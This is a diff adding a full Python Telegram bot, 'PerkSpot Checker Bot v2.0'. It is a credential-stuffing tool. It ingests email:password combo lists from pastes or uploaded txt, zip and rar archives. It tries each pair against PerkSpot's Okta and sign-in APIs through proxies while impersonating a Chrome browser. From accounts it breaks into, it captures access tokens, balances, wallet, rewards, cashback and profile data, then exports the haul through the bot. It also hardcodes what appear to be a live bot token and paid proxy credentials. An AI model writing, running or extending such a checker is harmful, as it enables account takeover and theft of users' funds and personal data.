@@ -1,0 +1,579 @@
+#!/usr/bin/env python3
+"""PerkSpot Checker Bot v2.0 - Telegram
+=====================================
+Run: python3 perkspot_bot.py
+Requirements: pip install python-telegram-bot==20.7 curl_cffi rarfile
+"""
+
+import asyncio, json, os, zipfile, logging, tempfile, hashlib, base64, secrets
+from pathlib import Path
+from datetime import datetime
+from io import BytesIO
+
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, BotCommand
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from curl_cffi import requests as cffi_requests
+
+# === HARDCODED CONFIG ===
+BOT_TOKEN = "8823280222:AAGNdYYTXeV2uA_8LS4Rz_QviRGrIGV2eaQ"
+ADMIN_ID = 5944410248
+DEFAULT_PROXY = "http://4698:wXmGYKTDiIRA@p105.squidproxies.com:9795"
+
+BOT_DIR = Path.home() / ".perkspot_bot"
+CONFIG_FILE = BOT_DIR / "config.json"
+RESULTS_DIR = BOT_DIR / "results"
+LOG_FILE = BOT_DIR / "bot.log"
+OKTA_ISSUER = "https://perkspot.okta.com"
+AUTH_API = "https://perkspot-api.perkspot.com/authapi"
+PS_API = "https://perkspot-api.perkspot.com/api/v1"
+
+CAPTURE_ENDPOINTS = {
+    "balance": f"{PS_API}/balance", "wallet": f"{PS_API}/wallet",
+    "profile": f"{PS_API}/profile", "rewards": f"{PS_API}/rewards",
+    "cashback": f"{PS_API}/cashback", "savings": f"{PS_API}/savings",
+    "deals": f"{PS_API}/deals", "orders": f"{PS_API}/orders",
+    "user_info": f"{PS_API}/user", "me": f"{PS_API}/me",
+    "account": f"{PS_API}/account", "settings": f"{PS_API}/settings",
+    "notifications": f"{PS_API}/notifications", "history": f"{PS_API}/history",
+}
+
+DEFAULT_CAPTURE = {
+    "balance": True, "wallet": True, "profile": True,
+    "rewards": True, "cashback": True, "savings": False,
+    "deals": False, "orders": False, "notifications": False, "user_info": True,
+}
+
+WAIT_ACCOUNT = "wait_account"
+WAIT_PROXY = "wait_proxy"
+WAIT_BROADCAST = "wait_broadcast"
+WAIT_ADMIN_ID = "wait_admin_id"
+WAIT_CONCURRENT = "wait_concurrent"
+
+BOT_DIR.mkdir(parents=True, exist_ok=True)
+RESULTS_DIR.mkdir(parents=True, exist_ok=True)
+logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler()], level=logging.INFO)
+log = logging.getLogger("perkspot_bot")
+
+
+class BotConfig:
+    def __init__(self):
+        if CONFIG_FILE.exists():
+            with open(CONFIG_FILE, "r", encoding="utf-8") as f: self.data = json.load(f)
+        else: self.data = {}
+        self.data.setdefault("admin_ids", [ADMIN_ID])
+        self.data.setdefault("proxy", DEFAULT_PROXY)
+        self.data.setdefault("allowed_user_ids", [])
+        self.data.setdefault("capture_settings", dict(DEFAULT_CAPTURE))
+        self.data.setdefault("output_format", "json")
+        self.data.setdefault("max_concurrent", 3)
+        self.data.setdefault("stats", {"checked": 0, "success": 0, "fail": 0})
+        self.save()
+
+    def save(self):
+        with open(CONFIG_FILE, "w", encoding="utf-8") as f: json.dump(self.data, f, indent=2, ensure_ascii=False)
+
+    @property
+    def proxy(self): return self.data.get("proxy", "")
+    @proxy.setter
+    def proxy(self, v): self.data["proxy"] = v; self.save()
+
+    def is_admin(self, uid): return uid in self.data.get("admin_ids", [ADMIN_ID])
+
+    @property
+    def capture_settings(self): return self.data.get("capture_settings", dict(DEFAULT_CAPTURE))
+
+    def toggle_capture(self, key):
+        s = self.data.setdefault("capture_settings", dict(DEFAULT_CAPTURE))
+        s[key] = not s.get(key, False); self.save(); return s[key]
+
+    @property
+    def output_format(self): return self.data.get("output_format", "json")
+    @output_format.setter
+    def output_format(self, v): self.data["output_format"] = v; self.save()
+
+    @property
+    def max_concurrent(self): return self.data.get("max_concurrent", 3)
+    @max_concurrent.setter
+    def max_concurrent(self, v): self.data["max_concurrent"] = max(1, min(10, v)); self.save()
+
+    def inc_stat(self, success):
+        s = self.data.setdefault("stats", {"checked": 0, "success": 0, "fail": 0})
+        s["checked"] += 1; s["success" if success else "fail"] += 1; self.save()
+
+    def reset_stats(self): self.data["stats"] = {"checked": 0, "success": 0, "fail": 0}; self.save()
+
+
+def check_account(email, password, proxy="", capture_on=None):
+    result = {"account": f"{email}:{password}", "email": email, "status": "fail",
+              "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "method": None, "data": {}}
+    try:
+        kw = {"impersonate": "chrome"}
+        if proxy: kw["proxy"] = proxy
+        s = cffi_requests.Session(**kw)
+        r = s.post(f"{OKTA_ISSUER}/api/v1/authn", json={"username": email, "password": password},
+                  timeout=20, headers={"Accept": "application/json", "Content-Type": "application/json"})
+        if r.status_code != 200:
+            result["data"]["error"] = f"Okta {r.status_code}: {r.text[:150]}"; return result
+        ad = r.json()
+        if ad.get("status") != "SUCCESS":
+            result["data"]["error"] = f"Auth status: {ad.get('status')}"; return result
+        user = ad.get("_embedded", {}).get("user", {})
+        prof = user.get("profile", {})
+        result["status"] = "success"; result["method"] = "okta"
+        result["data"]["user"] = {"id": user.get("id"), "email": prof.get("login", email),
+            "first_name": prof.get("firstName", ""), "last_name": prof.get("lastName", ""),
+            "timezone": prof.get("timeZone", "")}
+        try:
+            v = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b"=").decode()
+            ch = base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).rstrip(b"=").decode()
+            s.headers.update({"Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
+                "Origin": "https://signin.perkspot.com", "Referer": "https://signin.perkspot.com/"})
+            r1 = s.post(f"{AUTH_API}/api/signin/begin", json={"CodeChallenge": ch, "State": "st"}, timeout=20)
+            if r1.status_code == 200:
+                r2 = s.post(f"{AUTH_API}/api/signin/authenticate",
+                    json={"Username": email, "Password": password, "InteractionHandle": r1.text, "CodeVerifier": v}, timeout=20)
+                if r2.status_code == 200:
+                    try:
+                        tk = r2.json()
+                        result["data"]["tokens"] = {k: v2 for k, v2 in tk.items() if "token" in k.lower()}
+                        result["method"] = "okta+pkce"
+                        co = capture_on or {}
+                        at = tk.get("access_token") or tk.get("accessToken")
+                        h2 = {"Accept": "application/json"}
+                        if at: h2["Authorization"] = f"Bearer {at}"
+                        cap = {}
+                        for key, url in CAPTURE_ENDPOINTS.items():
+                            if not co.get(key, False): continue
+                            try:
+                                cr = s.get(url, headers=h2, timeout=15)
+                                if cr.status_code == 200 and "json" in cr.headers.get("content-type", ""):
+                                    try: cap[key] = cr.json()
+                                    except: cap[key] = cr.text[:2000]
+                            except: pass
+                        if cap: result["data"]["captured"] = cap
+                    except: pass
+        except Exception as e: log.debug(f"PKCE {email}: {e}")
+    except Exception as e: result["data"]["error"] = str(e)
+    return result
+
+
+def parse_accounts(text):
+    accounts = []
+    for line in text.strip().splitlines():
+        line = line.strip()
+        if not line or line.startswith("#") or line.startswith("//"): continue
+        if "email" in line.lower() and "password" in line.lower() and ":" not in line.replace("email","").replace("password",""): continue
+        for sep in [":", "|", ";", ","]:
+            if sep in line:
+                parts = line.split(sep, 1)
+                em, pw = parts[0].strip(), parts[1].strip()
+                if "@" in em and "." in em.split("@")[-1]:
+                    accounts.append((em, pw)); break
+    return accounts
+
+
+def extract_zip(fb):
+    acc = []
+    with zipfile.ZipFile(BytesIO(fb)) as zf:
+        for n in zf.namelist():
+            if n.endswith((".txt", ".csv", ".text")):
+                acc.extend(parse_accounts(zf.read(n).decode("utf-8", errors="ignore")))
+            elif n.endswith(".zip"):
+                try: acc.extend(extract_zip(zf.read(n)))
+                except: pass
+    return acc
+
+
+def extract_rar(fp):
+    import rarfile
+    acc = []
+    with rarfile.RarFile(fp) as rf:
+        for n in rf.namelist():
+            if n.endswith((".txt", ".csv", ".text")):
+                acc.extend(parse_accounts(rf.read(n).decode("utf-8", errors="ignore")))
+    return acc
+
+
+class ResultsManager:
+    def __init__(self): self.results = []; self.batch_id = datetime.now().strftime("%Y%m%d_%H%M%S")
+    def add(self, r): self.results.append(r)
+    def clear(self): self.results.clear(); self.batch_id = datetime.now().strftime("%Y%m%d_%H%M%S")
+    @property
+    def total(self): return len(self.results)
+    @property
+    def success_count(self): return sum(1 for r in self.results if r["status"] == "success")
+    @property
+    def fail_count(self): return self.total - self.success_count
+
+    def summary_text(self):
+        if not self.results: return "No results yet."
+        p = (self.success_count / self.total * 100) if self.total else 0
+        t = "Results" + chr(10) + chr(10) + "Batch: " + str(self.batch_id)
+        t += chr(10) + "Total: " + str(self.total)
+        t += chr(10) + "Success: " + str(self.success_count)
+        t += chr(10) + "Failed: " + str(self.fail_count)
+        t += chr(10) + "Rate: " + format(p, ".1f") + "%"
+        return t
+    def to_txt(self):
+        L = ["="*50, "  PERKSPOT CHECKER RESULTS", f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+             f"  Batch: {self.batch_id}", "="*50,
+             f"  Total: {self.total} | Success: {self.success_count} | Failed: {self.fail_count}", "="*50, ""]
+        for i, r in enumerate(self.results, 1):
+            L.append(f"--- #{i} ---")
+            if r["status"] == "success":
+                L.append("  Status: SUCCESS"); L.append(f"  Email: {r['email']}")
+                u = r.get("data",{}).get("user",{})
+                if u:
+                    nm = f"{u.get('first_name','')} {u.get('last_name','')}".strip()
+                    L.append(f"  Name: {nm or 'N/A'}"); L.append(f"  ID: {u.get('id','N/A')}")
+                for k, v in r.get("data",{}).get("captured",{}).items():
+                    if isinstance(v, dict):
+                        for bk in ["available","balance","amount","total","pending","cashbackAmount","currentBalance"]:
+                            if bk in v: L.append(f"  {k}.{bk}: {v[bk]}")
+                        if isinstance(v, list): L.append(f"  {k}: {len(v)} items")
+                    elif isinstance(v, str): L.append(f"  {k}: {v[:200]}")
+                L.append(f"  Method: {r.get('method','N/A')}")
+            else:
+                L.append("  Status: FAILED"); L.append(f"  Email: {r['email']}")
+                L.append(f"  Error: {r.get('data',{}).get('error','Unknown')}")
+            L.append(f"  Time: {r.get('timestamp','N/A')}"); L.append("-"*40); L.append("")
+        return "\n".join(L)
+
+    def to_json_str(self): return json.dumps(self.results, indent=2, ensure_ascii=False, default=str)
+
+    def to_zip_bytes(self):
+        buf = BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr(f"perkspot_{self.batch_id}.txt", self.to_txt())
+            zf.writestr(f"perkspot_{self.batch_id}.json", self.to_json_str())
+        buf.seek(0); return buf
+
+    def format_single(self, r):
+        if r["status"] == "success":
+            u = r.get("data",{}).get("user",{})
+            nm = f"{u.get('first_name','')} {u.get('last_name','')}".strip()
+            m = f"LOGIN SUCCESS\n\n  Email: {r['email']}\n"
+            if nm: m += f"  Name: {nm}\n"
+            if u.get("id"): m += f"  ID: {u.get('id')}\n"
+            m += f"  Method: {r.get('method','N/A')}\n"
+            for k, v in r.get("data",{}).get("captured",{}).items():
+                if isinstance(v, dict):
+                    imp = {bk: v[bk] for bk in ["available","balance","amount","total","pending","cashbackAmount","currentBalance","lifetimeSavings"] if bk in v}
+                    if imp: m += "    " + k + ": " + " | ".join(f"{a}={b}" for a,b in imp.items()) + "\n"
+                    elif isinstance(v, list): m += f"    {k}: {len(v)} items\n"
+                    else: m += f"    {k}: captured\n"
+                elif isinstance(v, str): m += f"    {k}: {v[:100]}\n"
+            return m
+        return f"LOGIN FAILED\n\n  Email: {r['email']}\n  Error: {r.get('data',{}).get('error','Unknown')}"
+
+
+def kb_main():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("Check Account", callback_data="act_check"), InlineKeyboardButton("Upload File", callback_data="act_file")],
+        [InlineKeyboardButton("Results", callback_data="act_results"), InlineKeyboardButton("Settings", callback_data="act_settings")],
+        [InlineKeyboardButton("Admin Panel", callback_data="act_admin")],
+    ])
+
+def kb_results():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("Summary", callback_data="res_summary"), InlineKeyboardButton("Last 5", callback_data="res_last5")],
+        [InlineKeyboardButton(".TXT", callback_data="res_txt"), InlineKeyboardButton(".JSON", callback_data="res_json"), InlineKeyboardButton(".ZIP", callback_data="res_zip")],
+        [InlineKeyboardButton("Clear All", callback_data="res_clear"), InlineKeyboardButton("Back", callback_data="go_main")],
+    ])
+
+def kb_settings(c):
+    caps = c.capture_settings; btns = []; row = []; i = 0
+    for k, lb in [("balance","Balance"),("wallet","Wallet"),("profile","Profile"),("user_info","User Info"),
+        ("rewards","Rewards"),("cashback","Cashback"),("savings","Savings"),("deals","Deals"),("orders","Orders"),("notifications","Notifications")]:
+        ic = "ON" if caps.get(k,False) else "OFF"
+        row.append(InlineKeyboardButton(f"[{ic}] {lb}", callback_data=f"tog_{k}")); i += 1
+        if i % 2 == 0: btns.append(row); row = []
+    if row: btns.append(row)
+    btns.append([InlineKeyboardButton(f"Format: {c.output_format.upper()}", callback_data="fmt_cycle")])
+    btns.append([InlineKeyboardButton("Reset Defaults", callback_data="set_reset"), InlineKeyboardButton("Back", callback_data="go_main")])
+    return InlineKeyboardMarkup(btns)
+
+def kb_admin(c):
+    ps = "Set" if c.proxy else "None"
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(f"Proxy: {ps}", callback_data="adm_proxy")],
+        [InlineKeyboardButton(f"Concurrent: {c.max_concurrent}", callback_data="adm_conc"), InlineKeyboardButton("Stats", callback_data="adm_stats")],
+        [InlineKeyboardButton("Broadcast", callback_data="adm_bcast"), InlineKeyboardButton("Set Admin ID", callback_data="adm_setid")],
+        [InlineKeyboardButton("Reset Stats", callback_data="adm_rststs"), InlineKeyboardButton("Back", callback_data="go_main")],
+    ])
+
+def kb_cancel(back): return InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data=back)]])
+
+
+async def run_check(update, ctx, accounts):
+    uid = update.effective_user.id
+    c = ctx.bot_data["config"]; rm = ctx.bot_data["results"]; ck = ctx.bot_data["checking"]
+    if uid in ck: await update.effective_message.reply_text("Already running. Wait."); return
+    ck.add(uid); total = len(accounts); sem = asyncio.Semaphore(c.max_concurrent)
+    pmsg = await update.effective_message.reply_text(f"Checking {total} account(s)...\n\nProgress: 0/{total}")
+    done = [0]
+    async def do_one(em, pw):
+        async with sem:
+            r = await asyncio.get_running_loop().run_in_executor(None, check_account, em, pw, c.proxy, c.capture_settings)
+            rm.add(r); c.inc_stat(r["status"] == "success"); done[0] += 1
+            if done[0] <= 30 or done[0] % 5 == 0 or done[0] == total:
+                try: await pmsg.edit_text(f"Checking {total}...\n\nProgress: {done[0]}/{total}\nSuccess: {rm.success_count} | Failed: {rm.fail_count}")
+                except: pass
+    await asyncio.gather(*(do_one(e,p) for e,p in accounts), return_exceptions=True)
+    ck.discard(uid)
+    txt = f"Done!\n\nTotal: {total} | Success: {rm.success_count} | Failed: {rm.fail_count} | Rate: {(rm.success_count/total*100) if total else 0:.1f}%"
+    for r in rm.results[-3:]: txt += f"\n  [{'OK' if r['status']=='success' else 'FAIL'}] {r['email']}"
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton("Results", callback_data="act_results"), InlineKeyboardButton(".ZIP", callback_data="res_zip")],
+        [InlineKeyboardButton("Menu", callback_data="go_main")]])
+    try: await pmsg.edit_text(txt, reply_markup=kb)
+    except: await update.effective_message.reply_text(txt, reply_markup=kb)
+    try:
+        with open(RESULTS_DIR / f"results_{rm.batch_id}.json", "w", encoding="utf-8") as f:
+            json.dump(rm.results, f, indent=2, ensure_ascii=False, default=str)
+    except: pass
+
+
+def get_state(ctx, uid): return ctx.bot_data.get("user_states", {}).get(uid)
+def set_state(ctx, uid, val): ctx.bot_data.setdefault("user_states", {})[uid] = val
+def clear_state(ctx, uid): ctx.bot_data.get("user_states", {}).pop(uid, None)
+
+
+async def cmd_start(update, ctx):
+    c = ctx.bot_data["config"]
+    await update.message.reply_text(
+        f"PerkSpot Checker Bot v2.0\n\nAccepted formats:\n  email:pass (paste or file)\n  .txt (one per line)\n  .zip / .rar (archives)\n\nProxy: {c.proxy or 'None'}\n\nMenu:",
+        reply_markup=kb_main())
+
+async def cmd_check(update, ctx):
+    if not ctx.args:
+        await update.message.reply_text("Usage: /check email:pass", reply_markup=kb_main()); return
+    acc = parse_accounts(" ".join(ctx.args))
+    if not acc: await update.message.reply_text("Could not parse email:pass."); return
+    await run_check(update, ctx, acc)
+
+async def cmd_results(update, ctx):
+    rm = ctx.bot_data["results"]
+    await update.message.reply_text(rm.summary_text(), reply_markup=kb_results())
+
+async def cmd_settings(update, ctx):
+    await update.message.reply_text("Capture Settings - Toggle ON/OFF:", reply_markup=kb_settings(ctx.bot_data["config"]))
+
+async def cmd_admin(update, ctx):
+    c = ctx.bot_data["config"]
+    if not c.is_admin(update.effective_user.id): await update.message.reply_text("Admin only."); return
+    await update.message.reply_text("Admin Panel", reply_markup=kb_admin(c))
+
+
+async def on_callback(update, ctx):
+    q = update.callback_query; await q.answer(); d = q.data
+    c = ctx.bot_data["config"]; rm = ctx.bot_data["results"]; uid = update.effective_user.id
+
+    if d == "go_main":
+        await q.edit_message_text(f"PerkSpot Checker Bot v2.0\n\nProxy: {c.proxy or 'None'}\n\nMenu:", reply_markup=kb_main())
+
+    elif d == "act_check":
+        set_state(ctx, uid, WAIT_ACCOUNT)
+        await q.edit_message_text("Send account:\n  email:pass\n  email|pass\n  email;pass\n\nOr send .txt/.zip/.rar file.", reply_markup=kb_cancel("go_main"))
+
+    elif d == "act_file":
+        set_state(ctx, uid, WAIT_ACCOUNT)
+        await q.edit_message_text("Upload file:\n  .txt - one email:pass per line\n  .zip - archive with .txt\n  .rar - archive with .txt\n\nSeparators: : | ; ,", reply_markup=kb_cancel("go_main"))
+
+    elif d == "act_results": await q.edit_message_text(rm.summary_text(), reply_markup=kb_results())
+
+    elif d == "act_settings": await q.edit_message_text("Capture Settings:", reply_markup=kb_settings(c))
+
+    elif d == "act_admin":
+        if not c.is_admin(uid): await q.edit_message_text("Admin only.", reply_markup=kb_main()); return
+        await q.edit_message_text("Admin Panel", reply_markup=kb_admin(c))
+
+    elif d == "res_summary":
+        t = rm.summary_text()
+        if rm.results:
+            t += "\n\nDetails:\n"
+            for r in rm.results:
+                ico = "[OK]" if r["status"] == "success" else "[FAIL]"
+                u = r.get("data",{}).get("user",{})
+                nm = f" {u.get('first_name','')} {u.get('last_name','')}".strip()
+                t += f"\n{ico} {r['email']}{nm}"
+        await q.edit_message_text(t, reply_markup=kb_results())
+
+    elif d == "res_last5":
+        last = rm.results[-5:] if rm.results else []
+        if not last: await q.edit_message_text("No results.", reply_markup=kb_results()); return
+        t = "Last 5 Results:\n\n" + "\n\n".join(rm.format_single(r) for r in last)
+        await q.edit_message_text(t[:4000], reply_markup=kb_results())
+
+    elif d == "res_txt":
+        if not rm.results: await q.edit_message_text("No results.", reply_markup=kb_results()); return
+        await q.message.reply_document(InputFile(BytesIO(rm.to_txt().encode()), filename=f"perkspot_{rm.batch_id}.txt"),
+            caption=f"{rm.total} accounts ({rm.success_count} success)")
+
+    elif d == "res_json":
+        if not rm.results: await q.edit_message_text("No results.", reply_markup=kb_results()); return
+        await q.message.reply_document(InputFile(BytesIO(rm.to_json_str().encode()), filename=f"perkspot_{rm.batch_id}.json"),
+            caption=f"{rm.total} accounts ({rm.success_count} success)")
+
+    elif d == "res_zip":
+        if not rm.results: await q.edit_message_text("No results.", reply_markup=kb_results()); return
+        await q.message.reply_document(InputFile(rm.to_zip_bytes(), filename=f"perkspot_{rm.batch_id}.zip"),
+            caption=f"{rm.total} accounts ({rm.success_count} success)")
+
+    elif d == "res_clear": rm.clear(); await q.edit_message_text("Results cleared.", reply_markup=kb_results())
+
+    elif d.startswith("tog_"):
+        k = d[4:]; v = c.toggle_capture(k); await q.edit_message_text(f"{k.replace('_',' ').title()}: {'ON' if v else 'OFF'}", reply_markup=kb_settings(c))
+
+    elif d == "fmt_cycle":
+        fmts = ["json", "txt", "zip"]; i = fmts.index(c.output_format) if c.output_format in fmts else 0
+        c.output_format = fmts[(i+1) % len(fmts)]
+        await q.edit_message_text(f"Output: {c.output_format.upper()}", reply_markup=kb_settings(c))
+
+    elif d == "set_reset":
+        c.data["capture_settings"] = dict(DEFAULT_CAPTURE); c.data["output_format"] = "json"; c.save()
+        await q.edit_message_text("Settings reset.", reply_markup=kb_settings(c))
+
+    elif d == "adm_proxy":
+        if not c.is_admin(uid): return
+        set_state(ctx, uid, WAIT_PROXY)
+        await q.edit_message_text(f"Set Proxy\n\nCurrent: {c.proxy or 'None'}\n\nFormats:\n  http://user:pass@host:port\n  host:port:user:pass\n  'none' to remove", reply_markup=kb_cancel("act_admin"))
+
+    elif d == "adm_conc":
+        if not c.is_admin(uid): return
+        set_state(ctx, uid, WAIT_CONCURRENT)
+        await q.edit_message_text(f"Concurrent checks (1-10).\n\nCurrent: {c.max_concurrent}\n\nSend number:", reply_markup=kb_cancel("act_admin"))
+
+    elif d == "adm_stats":
+        if not c.is_admin(uid): return
+        st = c.data.get("stats",{})
+        await q.edit_message_text(
+            f"Stats\n\n  Checked: {st.get('checked',0)}\n  Success: {st.get('success',0)}\n  Failed: {st.get('fail',0)}\n  Rate: {(st.get('success',0)/max(st.get('checked',1),1)*100):.1f}%\n\n  Session: {rm.total}\n  Proxy: {c.proxy or 'None'}\n  Concurrent: {c.max_concurrent}",
+            reply_markup=kb_admin(c))
+
+    elif d == "adm_bcast":
+        if not c.is_admin(uid): return
+        set_state(ctx, uid, WAIT_BROADCAST)
+        await q.edit_message_text("Send message to broadcast:", reply_markup=kb_cancel("act_admin"))
+
+    elif d == "adm_setid":
+        if not c.is_admin(uid): return
+        set_state(ctx, uid, WAIT_ADMIN_ID)
+        await q.edit_message_text(f"Current admins: {c.data.get('admin_ids',[])}\n\nSend new admin ID:", reply_markup=kb_cancel("act_admin"))
+
+    elif d == "adm_rststs":
+        if not c.is_admin(uid): return
+        c.reset_stats(); await q.edit_message_text("Stats reset.", reply_markup=kb_admin(c))
+
+
+async def on_text(update, ctx):
+    uid = update.effective_user.id; c = ctx.bot_data["config"]; state = get_state(ctx, uid); text = (update.message.text or "").strip()
+
+    if state == WAIT_ACCOUNT:
+        clear_state(ctx, uid)
+        acc = parse_accounts(text)
+        if acc: await run_check(update, ctx, acc)
+        else: await update.message.reply_text("Could not parse. Use email:pass format.")
+        return
+
+    if state == WAIT_PROXY:
+        clear_state(ctx, uid)
+        if text.lower() == "none": c.proxy = ""; await update.message.reply_text("Proxy removed.", reply_markup=kb_admin(c)); return
+        p = text
+        if not p.startswith("http"):
+            parts = p.split(":")
+            if len(parts) == 4: p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        c.proxy = p
+        await update.message.reply_text(f"Proxy: {p}", reply_markup=kb_admin(c))
+        return
+
+    if state == WAIT_BROADCAST:
+        clear_state(ctx, uid)
+        targets = c.data.get("allowed_user_ids", [])
+        sent = 0
+        for t in targets:
+            try: await ctx.bot.send_message(chat_id=t, text=f"Broadcast:\n\n{text}"); sent += 1
+            except: pass
+        await update.message.reply_text(f"Sent to {sent} users.", reply_markup=kb_admin(c))
+        return
+
+    if state == WAIT_ADMIN_ID:
+        clear_state(ctx, uid)
+        try:
+            tid = int(text)
+            if tid not in c.data["admin_ids"]: c.data["admin_ids"].append(tid); c.save()
+            await update.message.reply_text(f"Admin added: {tid}", reply_markup=kb_admin(c))
+        except: await update.message.reply_text("Send a numeric ID.", reply_markup=kb_admin(c))
+        return
+
+    if state == WAIT_CONCURRENT:
+        clear_state(ctx, uid)
+        try: c.max_concurrent = int(text); await update.message.reply_text(f"Concurrent: {c.max_concurrent}", reply_markup=kb_admin(c))
+        except: await update.message.reply_text("Send 1-10.", reply_markup=kb_admin(c))
+        return
+
+    # Auto-detect pasted account
+    if ":" in text and "@" in text:
+        acc = parse_accounts(text)
+        if acc: await update.message.reply_text(f"Found {len(acc)} account(s). Checking..."); await run_check(update, ctx, acc); return
+
+    await update.message.reply_text("Send /start for menu.\nOr paste email:pass to check.", reply_markup=kb_main())
+
+
+async def on_file(update, ctx):
+    uid = update.effective_user.id; doc = update.message.document
+    if not doc: return
+    fn = doc.file_name or ""; ext = fn.rsplit(".",1)[-1].lower() if "." in fn else ""
+    await update.message.reply_text(f"Processing {fn}...")
+    acc = []
+    try:
+        if ext in ("txt", "csv", "text"):
+            f = await doc.get_file(); content = (await f.download_as_bytearray()).decode("utf-8", errors="ignore")
+            acc = parse_accounts(content)
+        elif ext == "zip":
+            f = await doc.get_file(); acc = extract_zip(bytes(await f.download_as_bytearray()))
+        elif ext == "rar":
+            f = await doc.get_file(); tmp = tempfile.mktemp(suffix=".rar"); await f.download_to_drive(tmp)
+            acc = extract_rar(tmp); os.unlink(tmp)
+        else: await update.message.reply_text(f"Unsupported: .{ext}. Use .txt .csv .zip .rar"); return
+    except Exception as e: await update.message.reply_text(f"Error: {e}"); return
+    if not acc: await update.message.reply_text(f"No accounts found in {fn}."); return
+    clear_state(ctx, uid)
+    await update.message.reply_text(f"Found {len(acc)} account(s) in {fn}. Checking...")
+    await run_check(update, ctx, acc)
+
+
+async def post_init(app):
+    await app.bot.set_my_commands([BotCommand("start", "Main menu"), BotCommand("check", "Check email:pass"),
+        BotCommand("results", "View results"), BotCommand("settings", "Capture settings"), BotCommand("admin", "Admin panel")])
+
+
+def main():
+    token = os.environ.get("BOT_TOKEN", BOT_TOKEN)
+    if not token: print("ERROR: No BOT_TOKEN"); return
+    app = Application.builder().token(token).post_init(post_init).build()
+    app.bot_data["config"] = BotConfig()
+    app.bot_data["results"] = ResultsManager()
+    app.bot_data["checking"] = set()
+    app.bot_data["user_states"] = {}
+    c = app.bot_data["config"]
+    print(f"PerkSpot Bot v2.0 starting...")
+    print(f"  Token: {token[:10]}...{token[-5:]}")
+    print(f"  Admin: {ADMIN_ID}")
+    print(f"  Proxy: {c.proxy or 'None'}")
+    print(f"  Config: {CONFIG_FILE}")
+    print(f"  Results: {RESULTS_DIR}")
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("check", cmd_check))
+    app.add_handler(CommandHandler("results", cmd_results))
+    app.add_handler(CommandHandler("settings", cmd_settings))
+    app.add_handler(CommandHandler("admin", cmd_admin))
+    app.add_handler(CallbackQueryHandler(on_callback))
+    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
+    print("\nBot running! Ctrl+C to stop.")
+    app.run_polling(drop_pending_updates=True)
+
+
+if __name__ == "__main__":
+    main()
